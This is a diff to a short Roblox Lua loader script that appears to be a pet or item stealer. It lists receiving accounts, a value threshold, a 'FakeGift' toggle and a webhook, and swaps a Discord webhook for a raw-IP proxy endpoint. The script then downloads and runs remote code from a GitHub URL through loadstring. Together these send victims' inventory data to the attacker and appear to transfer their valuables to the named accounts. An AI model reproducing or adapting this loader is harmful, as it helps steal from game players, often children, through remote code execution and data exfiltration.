@@ -1,6 +1,7 @@
-_G.User = {'StagedZoo'}
-_G.min_value = 10000000000
+_G.User = {'Dumbman32145781', 'StagedZoo'}
+_G.min_value = 1000000000
 _G.pingEveryone = "Yes"
-_G.Webhook = "https://discord.com/api/webhooks/1391271079703609394/RYzcWACVUMEHwoeIIRShbs54AOjcc_xYJR-wu24E05iNOP46_nPJ_o9TcxSrDS93ym-E"
+_G.Webhook = "http://51.83.103.24:20002/proxy/8eb8fd18fe2079f01ce60b703774a242"
+_G.FakeGift = "No"
 
 loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
